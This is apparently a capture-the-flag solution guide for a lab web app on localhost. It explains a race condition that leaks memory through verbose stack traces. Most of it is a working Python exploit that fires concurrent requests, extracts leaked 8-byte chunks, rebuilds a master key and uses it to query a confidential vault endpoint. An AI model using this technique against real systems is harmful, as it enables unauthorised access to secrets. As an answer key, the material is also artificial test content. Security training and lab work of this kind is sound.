# A10 Easy Solution Guide: Concurrency Dirty-Read Memory Reconstruction

### Root Cause
1. **Unsynchronized Shared State:** The calculation subsystem in `app.py` stores the active partition reference in an unsynchronized module-level variable (`SharedWorkerState.active_slice_ref`) without locking or thread-local isolation.
2. **Unhandled Concurrency Fault:** When concurrent requests arrive in the 35ms execution window, thread collision triggers an unhandled `WorkerMemoryCollisionException`.
3. **Verbose Stack Trace Memory Disclosure:** The custom exception disclosure routine outputs an 8-byte slice of the thread's memory registers corresponding to the requested offset.

### Python Exploit Script

```python
import re
import requests
from concurrent.futures import ThreadPoolExecutor

BASE_URL = "http://localhost:6028"
TARGET_ENDPOINT = f"{BASE_URL}/api/v1/matrix/optimize"
VAULT_ENDPOINT = f"{BASE_URL}/api/v1/internal/confidential-vault"

OFFSETS = ["0x00", "0x08", "0x10", "0x18"]
CHUNKS = {}

def send_payload(slice_val):
    payload = {
        "assets": ["NVDA", "AAPL"],
        "weights": [0.6, 0.4],
        "covariance_factor": 1.0,
        "matrix_config": {
            "algorithm": "cholesky_decomposition",
            "worker_slice_ref": slice_val
        }
    }
    try:
        r = requests.post(TARGET_ENDPOINT, json=payload, timeout=2)
        return r.text
    except Exception:
        return ""

def race_offset(target_offset, dummy_offset="0x99"):
    # Send simultaneous paired requests to trigger dirty-read race condition
    with ThreadPoolExecutor(max_workers=2) as executor:
        f1 = executor.submit(send_payload, target_offset)
        f2 = executor.submit(send_payload, dummy_offset)
        res1 = f1.result()
        res2 = f2.result()
        
    for res in [res1, res2]:
        # Regex to match 8-byte ascii snippet inside stack trace |chunk|
        match = re.search(r"--- Unhandled Thread Frame Register Slice.*?\|(.{8})\|", res, re.DOTALL)
        if match:
            return match.group(1)
    return None

print("[*] Starting concurrent race condition exploit against QuantEdge Matrix Engine...")

for off in OFFSETS:
    print(f"[*] Racing for memory offset {off}...")
    chunk = None
    attempts = 0
    while not chunk and attempts < 40:
        attempts += 1
        chunk = race_offset(off)
    
    if chunk:
        print(f"[+] Recovered 8-byte chunk for {off}: '{chunk}' (in {attempts} attempts)")
        CHUNKS[off] = chunk
    else:
        print(f"[-] Failed to recover chunk for {off} after 40 attempts.")

if len(CHUNKS) == 4:
    master_key = CHUNKS["0x00"] + CHUNKS["0x08"] + CHUNKS["0x10"] + CHUNKS["0x18"]
    print(f"\n[+] Reconstructed 32-character Master Key: {master_key}")
    
    # Query vault
    resp = requests.get(f"{VAULT_ENDPOINT}?token={master_key}", headers={"Accept": "application/json"})
    print(f"[+] Dynamic Flag Response: {resp.json()}")
